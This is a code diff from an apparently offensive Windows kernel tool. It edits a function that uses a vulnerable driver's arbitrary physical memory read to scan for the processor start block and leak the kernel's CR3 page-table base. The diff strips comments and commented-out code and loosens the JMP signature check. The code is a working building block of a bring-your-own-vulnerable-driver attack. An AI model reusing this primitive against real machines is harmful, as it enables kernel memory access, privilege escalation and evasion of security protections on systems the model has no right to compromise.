@@ -120,16 +120,11 @@ namespace virtual_memory {
 	}
 
 	// https://public.cnotools.studio/bring-your-own-vulnerable-kernel-driver-byovkd/utilities/leaking-kernel-dtb
-	// Leak PML4 base address of Kernel from Low Stub using
-	// arbitrary physical memory read primitive
 	uintptr_t GetPml4Base(HANDLE driver) {
-		DWORD offset = 0x1000; // _PROCESSOR_START_BLOCK PA on real hardware
-		DWORD limit = 0x100000; // _PROCESSOR_START_BLOCK PA maximum limit = 1MB
+		DWORD offset = 0x1000; 
+		DWORD limit = 0x100000; 
 		uintptr_t buffer = NULL;
-		BYTE buffer2 = NULL;
-		uintptr_t entry = NULL;
-		uintptr_t jmpSignature = 0x1000600E9; // JMP opcode
-		WORD cr3Offset = 0xa0; // 0x90(_PROCESSOR_START_BLOCK, _KPROCESSOR_STATE) + 0x10(_KSPECIAL_REGISTERS, Cr3)
+		WORD cr3Offset = 0xa0; 
 		uintptr_t pml4Base = NULL;
 
 		// Loop until we find _PROCESSOR_START_BLOCK PA by heuristic scanning and get CR3 value
@@ -140,7 +135,7 @@ namespace virtual_memory {
 			}
 			//std::cout << "\tOffset : " << std::hex << offset << "\tBuffer : " << std::hex << buffer << std::endl;
 			BYTE c = buffer & 0xff;
-			//if (buffer == 0x100063de9) {
+			
 			if (c == 0xe9){ // jmp
 				
 				if (!memory::read_physical_memory(driver, (offset + cr3Offset), &pml4Base, sizeof(uintptr_t))) {
@@ -150,23 +145,6 @@ namespace virtual_memory {
 				std::cout << "[+] Cr3 : " << std::hex << pml4Base << std::endl;
 				break;
 			}
-			// Mask some bits
-			//entry = (buffer & 0xffffffffffff00ff);
-
-			// We found _PROCESSOR_START_BLOCK PA
-			//if (entry == jmpSignature) {
-				/*std::cout << "[+] _PROCESSOR_START_BLOCK found at PA : 0x" << std::hex << offset << std::endl;
-
-				// Read nt!_KSPECIAL_REGISTERS.Cr3 to get PML4 base for Kernel
-				if (!memory::read_physical_memory(driver, (offset + cr3Offset), &pml4Base, sizeof(uintptr_t))) {
-					std::cout << "[-] Unable to read physical memory to get _LSPECIAL_REGISTERS.cr3\n";
-					return NULL;
-				}
-
-				std::cout << "[+] PML4 base for kernel : 0x" << std::hex << pml4Base << std::endl;
-
-				break;
-			}*/
 
 			offset += 0x1000;
 		}
